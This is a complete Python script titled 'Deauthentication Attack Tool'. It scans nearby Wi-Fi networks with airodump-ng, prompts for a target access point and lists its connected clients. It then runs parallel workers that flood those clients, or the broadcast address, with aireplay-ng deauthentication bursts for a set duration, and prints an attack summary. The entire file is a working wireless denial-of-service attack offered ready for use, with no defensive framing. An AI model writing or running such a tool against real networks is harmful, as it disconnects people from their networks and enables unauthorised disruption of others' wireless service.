#!/usr/bin/env python3
import csv
import os
import sys
import time
import signal
import subprocess
import threading
import pprint
import logging
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------- LOGGER SETUP -----------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)
logger = logging.getLogger("deauth")


# ----------------- RUN_CMD FUNCTION -----------------
def run_cmd(cmd: List[str], timeout: int | None = 60) -> Tuple[int, str, str]:
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return proc.returncode, proc.stdout.strip(), proc.stderr.strip()
    except subprocess.TimeoutExpired as e:
        return -1, "", f"TimeoutExpired: {e}"
    except Exception as e:
        return -1, "", str(e)


# ----------------- SCAN FUNCTION -----------------
def scan_once(iface: str, duration: int = 10, out_prefix: str | None = None) -> Optional[Path]:
    if out_prefix:
        out_prefix_path = Path(out_prefix).with_suffix('')
    else:
        out_prefix_path = Path(f"scan_{int(time.time())}")

    csv_path = out_prefix_path.parent / f"{out_prefix_path.name}-01.csv"
    cmd = ["airodump-ng", "--write", str(out_prefix_path), "--output-format", "csv", iface]

    logger.info("Starting scan on interface %s for %d seconds...", iface, duration)

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )

        try:
            proc.wait(timeout=duration)
        except subprocess.TimeoutExpired:
            logger.info("Timer done (%ds). Terminating process...", duration)
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                logger.warning("Process did not exit after SIGTERM; killing...")
                try:
                    os.killpg(proc.pid, signal.SIGKILL)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                proc.wait()

    except FileNotFoundError as e:
        logger.error("airodump-ng not found: %s", e)
        return None
    except Exception as e:
        logger.error("Failed to start scan process: %s", e)
        return None

    return csv_path if csv_path.exists() else None


# ----------------- PARSING FUNCTIONS -----------------

def parse_scan(csv_path: Path) -> Dict[str, List[Dict]]:
    aps = []
    stations = []

    with open(csv_path, newline='', encoding='utf-8', errors='replace') as fh:
        reader = csv.reader(fh)
        rows = list(reader)

    ap_header_idx = None
    for i, row in enumerate(rows):
        if row and any(cell.strip().lower() == 'bssid' for cell in row):
            ap_header_idx = i
            break
    if ap_header_idx is None:
        raise ValueError("AP header (BSSID) not found in CSV")

    station_header_idx = None
    for j in range(ap_header_idx + 1, len(rows)):
        row = rows[j]
        if not row or all(cell.strip() == "" for cell in row):
            k = j + 1
            while k < len(rows) and (not rows[k] or all(cell.strip() == "" for cell in rows[k])):
                k += 1
            if k < len(rows) and any("station" in (c.strip().lower()) for c in rows[k]):
                station_header_idx = k
            break

    ap_columns = [c.strip() for c in rows[ap_header_idx]]
    ap_rows_start = ap_header_idx + 1
    ap_rows_end = station_header_idx - 1 if station_header_idx else len(rows)

    for r in rows[ap_rows_start:ap_rows_end]:
        if not r or all(cell.strip() == "" for cell in r):
            continue
        data = {ap_columns[i]: r[i].strip() if i < len(r) else "" for i in range(len(ap_columns))}
        ap = {
            "bssid": data.get("BSSID") or data.get("bssid"),
            "channel": _try_int(data.get("channel") or data.get("CH") or data.get("Channel")),
            "power": _try_int(data.get("Power") or data.get("PWR")),
            "beacons": _try_int(data.get("# beacons") or data.get("Beacons")),
            "essid": data.get("ESSID") or data.get("ESSID "),
            "privacy": data.get("Privacy"),
            "raw": data
        }
        aps.append(ap)

    if station_header_idx:
        station_columns = [c.strip() for c in rows[station_header_idx]]
        for r in rows[station_header_idx + 1:]:
            if not r or all(cell.strip() == "" for cell in r):
                continue
            data = {station_columns[i]: r[i].strip() if i < len(r) else "" for i in range(len(station_columns))}
            st = {
                "station": data.get("Station MAC") or data.get("station"),
                "bssid": data.get("BSSID"),
                "power": _try_int(data.get("Power") or data.get("PWR")),
                "packets": _try_int(data.get("# packets") or data.get("Packets")),
                "probed": data.get("Probed ESSIDs"),
                "raw": data
            }
            stations.append(st)

    return {"aps": aps, "stations": stations}


def _try_int(s):
    if s is None or s == "":
        return None
    try:
        return int(s)
    except Exception:
        try:
            return int(s.strip().strip('*'))
        except Exception:
            return None


def choose_ap_by_name(aps: List[Dict], essid: str) -> Optional[Dict]:
    for ap in aps:
        if ap.get("essid") and essid.lower() in ap.get("essid").lower():
            return ap
    return None


# ----------------- DEAUTH FUNCTIONS -----------------

def deauthenticate(bssid_ap: str, bssid_client: Optional[str], iface: str, count: int = 5) -> Tuple[int, str, str]:
    cmd_deauth = ["aireplay-ng", "--deauth", str(count), "-a", bssid_ap]
    if bssid_client:
        cmd_deauth += ["-c", bssid_client]
    cmd_deauth.append(iface)
    
    logger.info(f"Deauth command: {' '.join(cmd_deauth)}")
    
    timeout = 15 + (count * 2 if count > 0 else 30)
    rc, stdout, stderr = run_cmd(cmd_deauth, timeout=timeout)
    
    if rc != 0:
        logger.error(f"Deauth failed for client {bssid_client}: {stderr}")
    else:
        logger.info(f"Deauth sent successfully to {bssid_client or 'broadcast'}")
    
    return rc, stdout, stderr


def deauth_worker(client_mac: str, bssid_ap: str, iface: str, count: int, stop_event: threading.Event) -> Dict:

    result = {
        "client": client_mac,
        "success_count": 0,
        "fail_count": 0,
        "total_packets": 0
    }
    
    while not stop_event.is_set():
        rc, stdout, stderr = deauthenticate(bssid_ap, client_mac, iface, count)
        if rc == 0:
            result["success_count"] += 1
            result["total_packets"] += count
        else:
            result["fail_count"] += 1
        
        time.sleep(0.5)
    
    return result


# ----------------- AIRODUMP MONITORING -----------------

def start_client_monitor(iface: str, channel: int, bssid_ap: str, out_prefix: str, duration: int = 30) -> Optional[Path]:
    out_prefix_path = Path(out_prefix).with_suffix('')
    csv_path = out_prefix_path.parent / f"{out_prefix_path.name}-01.csv"
    
    cmd = [
        "airodump-ng",
        "-c", str(channel),
        "-d", bssid_ap,
        "--write", str(out_prefix_path),
        "--output-format", "csv",
        iface
    ]
    
    logger.info(f"Starting client monitor: {' '.join(cmd)}")
    
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        
        try:
            proc.wait(timeout=duration)
        except subprocess.TimeoutExpired:
            logger.info(f"Monitor duration ({duration}s) completed. Stopping...")
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
            
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(proc.pid, signal.SIGKILL)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                proc.wait()
                
    except FileNotFoundError as e:
        logger.error(f"airodump-ng not found: {e}")
        return None
    except Exception as e:
        logger.error(f"Failed to start monitor: {e}")
        return None
    
    return csv_path if csv_path.exists() else None


def get_connected_clients(csv_path: Path, bssid_ap: str) -> List[str]:
    try:
        parsed = parse_scan(csv_path)
        stations = parsed.get('stations', [])
        clients = [
            s.get('station') 
            for s in stations 
            if s.get('bssid') and s.get('station') and 
               s.get('bssid').lower() == bssid_ap.lower()
        ]
        return [c for c in clients if c]  # Filtrează None
    except Exception as e:
        logger.error(f"Failed to parse clients: {e}")
        return []


# ----------------- MAIN RUN FUNCTION -----------------

def run(iface: str, duration: int = 10, deauth_count: int = 5, attack_duration: int = 60):
    print(f"\n{'='*50}")
    print("       DEAUTHENTICATION ATTACK TOOL")
    print(f"{'='*50}\n")
    print(f"[*] Using interface: {iface}")
    print(f"[*] Initial scan duration: {duration}s")
    
    print(f"\n[STEP 1] Scanning for wireless networks...")
    csv_path = scan_once(iface, duration=duration, out_prefix="deauth_scan")
    
    if not csv_path:
        print("[!] Scan did not produce a CSV file. Is interface in monitor mode?")
        return 1
    
    print(f"[+] Scan completed: {csv_path}")
    
    try:
        parsed = parse_scan(csv_path)
    except Exception as e:
        print(f"[!] Failed to parse CSV: {e}")
        return 1
    
    aps = parsed.get('aps', [])
    
    if not aps:
        print("[!] No access points found.")
        return 1
    
    print(f"\n[STEP 2] Found {len(aps)} access point(s):\n")
    print(f"{'#':<4} {'ESSID':<30} {'BSSID':<20} {'CH':<5} {'PWR':<6} {'Privacy':<10}")
    print("-" * 80)
    
    valid_aps = []
    for i, ap in enumerate(aps):
        essid = ap.get('essid') or '<hidden>'
        bssid = ap.get('bssid') or 'N/A'
        channel = ap.get('channel') or '?'
        power = ap.get('power') or '?'
        privacy = ap.get('privacy') or 'N/A'
        
        if bssid and bssid != 'N/A':
            valid_aps.append(ap)
            print(f"{len(valid_aps):<4} {essid:<30} {bssid:<20} {channel:<5} {power:<6} {privacy:<10}")
    
    if not valid_aps:
        print("[!] No valid APs with BSSID found.")
        return 1
    
    print()
    
    while True:
        try:
            choice = input("[?] Enter AP number to target (or ESSID name): ").strip()
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(valid_aps):
                    focus = valid_aps[idx]
                    break
                else:
                    print("[!] Invalid number. Try again.")
            else:
                focus = choose_ap_by_name(valid_aps, choice)
                if focus:
                    break
                print(f"[!] No AP found matching '{choice}'. Try again.")
        except KeyboardInterrupt:
            print("\n[!] Cancelled by user.")
            return 1
    
    print(f"\n[+] Selected AP:")
    print(f"    ESSID: {focus.get('essid') or '<hidden>'}")
    print(f"    BSSID: {focus.get('bssid')}")
    print(f"    Channel: {focus.get('channel')}")
    
    bssid_ap = focus.get('bssid')
    channel = focus.get('channel')
    
    if not bssid_ap or not channel:
        print("[!] Invalid AP data (missing BSSID or channel).")
        return 1
    
    print(f"\n[STEP 3] Monitoring connected clients on channel {channel} for 30s...")
    
    client_csv = start_client_monitor(
        iface=iface,
        channel=channel,
        bssid_ap=bssid_ap,
        out_prefix="client_monitor",
        duration=30
    )
    
    if not client_csv:
        print("[!] Failed to monitor clients. Trying with initial scan data...")
        clients = get_connected_clients(csv_path, bssid_ap)
    else:
        clients = get_connected_clients(client_csv, bssid_ap)
        try:
            os.remove(client_csv)
        except:
            pass
    
    try:
        os.remove(csv_path)
        for f in Path('.').glob('deauth_scan*'):
            f.unlink()
        for f in Path('.').glob('client_monitor*'):
            f.unlink()
    except:
        pass
    
    if not clients:
        print("[!] No connected clients found.")
        print("[*] Will send broadcast deauth packets instead.")
        clients = [None]  # Broadcast
    else:
        print(f"\n[+] Found {len(clients)} connected client(s):")
        for i, client in enumerate(clients, 1):
            print(f"    {i}. {client}")
    
    print(f"\n[STEP 4] Starting deauthentication attack...")
    print(f"    Target AP: {bssid_ap}")
    print(f"    Clients: {len(clients)}")
    print(f"    Deauth packets per burst: {deauth_count}")
    print(f"    Attack duration: {attack_duration}s")
    print(f"\n[!] Press ENTER or Ctrl+C to stop the attack\n")
    
    stop_event = threading.Event()
    results = []
    
    def wait_for_enter():
        try:
            input()
            stop_event.set()
        except EOFError:
            pass
    
    enter_thread = threading.Thread(target=wait_for_enter, daemon=True)
    enter_thread.start()
    
    try:
        max_workers = min(len(clients), 10)  
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            
            for client_mac in clients:
                client_label = client_mac if client_mac else "broadcast"
                print(f"[*] Starting worker for: {client_label}")
                
                future = executor.submit(
                    deauth_worker,
                    client_mac,
                    bssid_ap,
                    iface,
                    deauth_count,
                    stop_event
                )
                futures.append((client_label, future))
            
            print(f"\n[*] {len(futures)} worker(s) running. Attack in progress...")
            
            start_time = time.time()
            while time.time() - start_time < attack_duration and not stop_event.is_set():
                elapsed = int(time.time() - start_time)
                remaining = attack_duration - elapsed
                print(f"\r[*] Attack running... {elapsed}s elapsed, {remaining}s remaining    ", end='', flush=True)
                time.sleep(1)
            
            if stop_event.is_set():
                print(f"\n\n[*] Attack stopped by user (ENTER pressed). Stopping workers...")
            else:
                print(f"\n\n[*] Attack duration completed. Stopping workers...")
            stop_event.set()
            
            for client_label, future in futures:
                try:
                    result = future.result(timeout=5)
                    results.append(result)
                except Exception as e:
                    logger.error(f"Worker error for {client_label}: {e}")
                    
    except KeyboardInterrupt:
        print(f"\n\n[!] Attack interrupted by user. Stopping workers...")
        stop_event.set()
        time.sleep(2) 
        
    print(f"\n{'='*50}")
    print("       ATTACK SUMMARY")
    print(f"{'='*50}\n")
    
    total_packets = 0
    total_success = 0
    total_fail = 0
    
    for result in results:
        client = result.get('client') or 'broadcast'
        success = result.get('success_count', 0)
        fail = result.get('fail_count', 0)
        packets = result.get('total_packets', 0)
        
        total_packets += packets
        total_success += success
        total_fail += fail
        
        print(f"  Client: {client}")
        print(f"    - Successful bursts: {success}")
        print(f"    - Failed bursts: {fail}")
        print(f"    - Total packets sent: {packets}")
        print()
    
    print(f"  TOTAL:")
    print(f"    - Total successful bursts: {total_success}")
    print(f"    - Total failed bursts: {total_fail}")
    print(f"    - Total deauth packets sent: {total_packets}")
    print(f"\n{'='*60}\n")
    
    return 0


# ----------------- ENTRY POINT -----------------

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Deauthentication Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python deauth.py -i wlan0mon
  python deauth.py -i wlan0mon -d 15 -c 10 -t 120
        """
    )
    
    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode (e.g., wlan0mon)")
    parser.add_argument("-d", "--duration", type=int, default=10,
                        help="Initial scan duration in seconds (default: 10)")
    parser.add_argument("-c", "--count", type=int, default=5,
                        help="Number of deauth packets per burst (default: 5)")
    parser.add_argument("-t", "--time", type=int, default=60,
                        help="Total attack duration in seconds (default: 60)")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] This script requires root privileges. Run with sudo.")
        sys.exit(1)
    
    sys.exit(run(
        iface=args.interface,
        duration=args.duration,
        deauth_count=args.count,
        attack_duration=args.time
    ))
